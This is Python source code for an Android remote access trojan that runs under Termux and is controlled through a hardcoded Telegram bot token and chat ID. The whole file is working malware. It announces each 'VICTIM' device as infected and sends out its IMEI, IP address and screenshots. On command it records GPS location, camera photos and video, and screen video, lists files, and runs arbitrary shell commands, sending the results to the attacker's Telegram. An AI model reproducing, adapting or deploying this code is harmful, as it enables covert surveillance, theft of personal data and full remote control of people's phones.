import requests
import subprocess
import os
import time
import json
import threading
from datetime import datetime

BOT_TOKEN = "8462518718:AAH7CmN_7WI7EihMdDWkMA1g00VEwq_b9Zo"
CHAT_ID = "7881284280"
DEVICE_ID = f"VICTIM_{int(time.time())}"

class CompleteRAT:
    def __init__(self):
        # Setup Termux storage silently
        os.system("termux-setup-storage > /dev/null 2>&1")
        self.last_update_id = 0
        
        # Send infection notification
        self.send_telegram(f"🟢 <b>{DEVICE_ID} INFECTED!</b>\n📱 Ready for commands:\n/trash /gps /screenshot /live_camera /live_screen /sysinfo /camera_back /camera_front /files")
        
        # Initial data dump
        self.sysinfo()
        self.screenshot()
        
        # Start command listener
        threading.Thread(target=self.command_listener, daemon=True).start()
    
    def send_telegram(self, text):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
            requests.post(url, data=data, timeout=10)
        except:
            pass
    
    def send_photo(self, caption, photo_path):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            with open(photo_path, 'rb') as f:
                files = {'photo': f}
                data = {'chat_id': CHAT_ID, 'caption': caption, 'parse_mode': 'HTML'}
                requests.post(url, data=data, files=files, timeout=30)
            os.remove(photo_path)
        except:
            pass
    
    def send_video(self, caption, video_path):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
            with open(video_path, 'rb') as f:
                files = {'video': f}
                data = {'chat_id': CHAT_ID, 'caption': caption, 'parse_mode': 'HTML'}
                requests.post(url, data=data, files=files, timeout=60)
            os.remove(video_path)
        except:
            pass
    
    def shell(self, cmd, timeout=30):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            output = (result.stdout + result.stderr).strip()
            return output if output else "EMPTY"
        except:
            return "ERROR"
    
    # 🗑️ TRASH FILES
    def trash(self):
        paths = ["/sdcard/.trash", "/sdcard/Android/data/com.android.documentsui/files/deleted", "/storage/emulated/0/.trash"]
        result = []
        for path in paths:
            ls = self.shell(f"ls -la '{path}' 2>/dev/null")
            if ls != "EMPTY" and ls != "ERROR":
                result.append(f"`{path}:`\n```{ls}```")
        return "\n\n".join(result) if result else "🗑️ No trash found"
    
    # 📍 GPS LOCATION
    def gps(self):
        gps = self.shell("termux-location -r once -n 1 2>/dev/null || echo 'GPS denied'")
        return f"📍 <b>GPS:</b>\n```{gps}```"
    
    # 📹 LIVE CAMERA (40s)
    def live_camera(self):
        video_path = f"/sdcard/{DEVICE_ID}_livecam.mp4"
        cmd = f"termux-camera-record -c 0 '{video_path}'"
        self.shell(cmd + " &")
        time.sleep(42)
        caption = f"📹 <b>{DEVICE_ID}</b> LIVE CAMERA (40s)"
        self.send_video(caption, video_path)
        return "📹 Live camera sent!"
    
    # 🖥️ LIVE SCREEN (40s)
    def live_screen(self):
        video_path = f"/sdcard/{DEVICE_ID}_livescreen.mp4"
        cmd = f"screenrecord --time-limit=40 '{video_path}'"
        self.shell(cmd + " &")
        time.sleep(44)
        caption = f"🖥️ <b>{DEVICE_ID}</b> LIVE SCREEN (40s)"
        self.send_video(caption, video_path)
        return "🖥️ Live screen sent!"
    
    # 📸 SINGLE CAMERA SHOT
    def camera(self, camera="back"):
        path = f"/sdcard/{DEVICE_ID}_{camera}.jpg"
        cmd = f"termux-camera-photo -c {0 if camera=='back' else 1} '{path}'"
        self.shell(cmd)
        time.sleep(3)
        caption = f"📸 <b>{DEVICE_ID}</b> {camera.upper()} CAMERA"
        self.send_photo(caption, path)
        return f"📸 {camera.upper()} photo sent!"
    
    # 🖥️ SCREENSHOT
    def screenshot(self):
        path = f"/sdcard/{DEVICE_ID}_screen.jpg"
        self.shell(f"screencap -p '{path}'")
        self.send_photo(f"🖥️ <b>{DEVICE_ID}</b> SCREENSHOT", path)
        return "🖥️ Screenshot sent!"
    
    # 💻 SYSTEM INFO
    def sysinfo(self):
        info = f"""
<b>DEVICE:</b> `{self.shell('getprop ro.product.model')}`
<b>ANDROID:</b> `{self.shell('getprop ro.build.version.release')}`
<b>BUILD:</b> `{self.shell('getprop ro.build.id')}`
<b>IMEI:</b> `{self.shell('service call iphonesubinfo 1 | cut -d" " -f2 | cut -c2-17 || echo UNKNOWN')}`
<b>STORAGE:</b> `{self.shell('df -h /sdcard | tail -1')}`
<b>IP:</b> `{self.shell("curl -s ipinfo.io/ip || echo 'No IP'")}`
        """
        self.send_telegram(f"💻 <b>{DEVICE_ID} INFO:</b>\n{info}")
    
    # ALL COMMANDS
    def process_command(self, cmd):
        cmd = cmd.strip().lower()
        
        if cmd == "gps":
            return self.gps()
        elif cmd == "trash":
            return self.trash()
        elif cmd == "live_camera":
            threading.Thread(target=self.live_camera, daemon=True).start()
            return "📹 Live camera recording... (check in ~45s)"
        elif cmd == "live_screen":
            threading.Thread(target=self.live_screen, daemon=True).start()
            return "🖥️ Screen recording... (check in ~45s)"
        elif cmd == "camera_back":
            return self.camera("back")
        elif cmd == "camera_front":
            return self.camera("front")
        elif cmd == "screenshot":
            return self.screenshot()
        elif cmd == "sysinfo":
            return self.sysinfo()
        elif cmd == "files":
            return f"📁 <b>/sdcard/</b>\n```{self.shell('ls -la /sdcard/ | head -20')}```"
        elif cmd.startswith("shell "):
            shell_cmd = cmd[6:]
            return f"💻 <code>{shell_cmd}</code>\n```{self.shell(shell_cmd)}```"
        else:
            return f"❓ Unknown: <code>{cmd}</code>\n\n<b>Available:</b>\n• /gps /screenshot /sysinfo\n• /camera_back /camera_front\n• /live_camera /live_screen\n• /trash /files\n• /shell <command>"
    
    def get_telegram_updates(self):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        params = {"offset": self.last_update_id + 1, "timeout": 30}
        try:
            resp = requests.get(url, params=params, timeout=40).json()
            if resp['ok']:
                for update in resp['result']:
                    self.last_update_id = update['update_id']
                    if 'message' in update and 'text' in update['message']:
                        cmd = update['message']['text'].strip()
                        if cmd.startswith('/'):
                            cmd = cmd[1:]
                            result = self.process_command(cmd)
                            self.send_telegram(f"<b>{DEVICE_ID}</b> → <code>{cmd}</code>\n\n{result}")
        except:
            pass
    
    def command_listener(self):
        while True:
            self.get_telegram_updates()
            time.sleep(2)

if __name__ == "__main__":
    rat = CompleteRAT()
    while True:
        time.sleep(60)